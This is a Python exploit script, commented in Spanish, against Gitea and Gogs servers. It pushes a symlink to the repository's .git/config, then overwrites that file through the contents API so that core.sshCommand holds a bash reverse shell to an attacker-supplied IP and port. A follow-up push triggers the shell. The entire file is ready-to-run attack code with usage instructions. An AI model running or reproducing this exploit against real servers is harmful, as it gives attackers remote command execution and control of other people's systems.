#!/usr/bin/env python3
"""
Gitea / Gogs - symlink .git/config poisoning -> RCE

Se abusa de la API de contenidos: se publica un symlink que apunta a
.git/config del propio repositorio y, via PutContents sobre ese symlink,
se sobreescribe el config inyectando core.sshCommand. Cuando el servidor
ejecuta git contra el repo (al recibir un push), dispara el comando y
devuelve ejecucion remota de comandos.

Uso:
    python3 gitea-gogs-symlink-git-config-rce.py http://TARGET:3000 \
        -u USUARIO -p PASSWORD --lhost ATACANTE_IP --lport 4444
"""
import argparse
import base64
import os
import random
import subprocess
import tempfile

import requests

requests.packages.urllib3.disable_warnings()


def main():
    ap = argparse.ArgumentParser(
        description="Gitea/Gogs symlink .git/config poisoning -> RCE"
    )
    ap.add_argument("url", help="URL base del Gitea/Gogs, ej http://target:3000")
    ap.add_argument("-u", "--user", required=True, help="usuario valido")
    ap.add_argument("-p", "--password", required=True, help="password del usuario")
    ap.add_argument("--lhost", required=True, help="IP de escucha para la reverse shell")
    ap.add_argument("--lport", default="4444", help="puerto de escucha (default 4444)")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    host = base.split("://", 1)[-1]
    U, P = args.user, args.password
    LH, LP = args.lhost, args.lport

    # 1) token de API via basic auth (sin CSRF)
    tname = "t" + str(random.randint(1000, 9999))
    r = requests.post(f"{base}/api/v1/users/{U}/tokens", auth=(U, P),
                      json={"name": tname})
    print("[*] token:", r.status_code)
    tok = r.json()["sha1"]
    H = {"Authorization": f"token {tok}"}

    # 2) crear repo vacio
    repo = "e" + str(random.randint(1000, 9999))
    r = requests.post(f"{base}/api/v1/user/repos", headers=H,
                      json={"name": repo, "auto_init": False, "private": False})
    print("[*] create repo", repo, ":", r.status_code)

    # 3) init local, agregar symlink malicious_link -> .git/config, push
    d = tempfile.mkdtemp()
    url = f"http://{U}:{P}@{host}/{U}/{repo}.git"
    env = dict(os.environ, GIT_AUTHOR_NAME="a", GIT_AUTHOR_EMAIL="a@a",
               GIT_COMMITTER_NAME="a", GIT_COMMITTER_EMAIL="a@a",
               GIT_TERMINAL_PROMPT="0")
    subprocess.run(["git", "init", "-q", "-b", "master", d], check=True, env=env)
    os.symlink(".git/config", os.path.join(d, "malicious_link"))
    subprocess.run(["git", "-C", d, "add", "malicious_link"], check=True, env=env)
    subprocess.run(["git", "-C", d, "commit", "-q", "-m", "x"], check=True, env=env)
    subprocess.run(["git", "-C", d, "remote", "add", "origin", url], check=True, env=env)
    subprocess.run(["git", "-C", d, "push", "-q", "-u", "origin", "master"],
                   check=True, env=env)
    print("[*] symlink pushed")

    # 4) obtener sha del blob del symlink
    r = requests.get(f"{base}/api/v1/repos/{U}/{repo}/contents/malicious_link",
                     headers=H)
    sha = r.json().get("sha")
    print("[*] link sha:", sha)

    # 5) envenenar .git/config a traves del symlink via PutContents
    cmd = f"bash -c 'bash -i >& /dev/tcp/{LH}/{LP} 0>&1' #"
    cfg = ("[core]\n"
           "\trepositoryformatversion = 0\n"
           "\tfilemode = true\n"
           "\tbare = false\n"
           "\tlogallrefupdates = true\n"
           f"\tsshCommand = {cmd}\n"
           "[remote \"origin\"]\n"
           f"\turl = git@localhost:{U}/{repo}.git\n"
           "[branch \"master\"]\n"
           "\tremote = origin\n"
           "\tmerge = refs/heads/master\n")
    body = {"message": "u", "content": base64.b64encode(cfg.encode()).decode()}
    if sha:
        body["sha"] = sha
    r = requests.put(f"{base}/api/v1/repos/{U}/{repo}/contents/malicious_link",
                     headers=H, json=body)
    print("[*] PUT poison:", r.status_code, r.text[:150])

    # 6) disparar: push de un commit vacio para que el server corra git
    #    contra el config envenenado
    subprocess.run(["git", "-C", d, "commit", "-q", "--allow-empty", "-m", "t"],
                   check=True, env=env)
    p = subprocess.run(["git", "-C", d, "push", "-q", "origin", "master"], env=env)
    print("[*] trigger push rc:", p.returncode)
    print("[+] done -> revisa tu listener en", LH, LP)


if __name__ == "__main__":
    main()
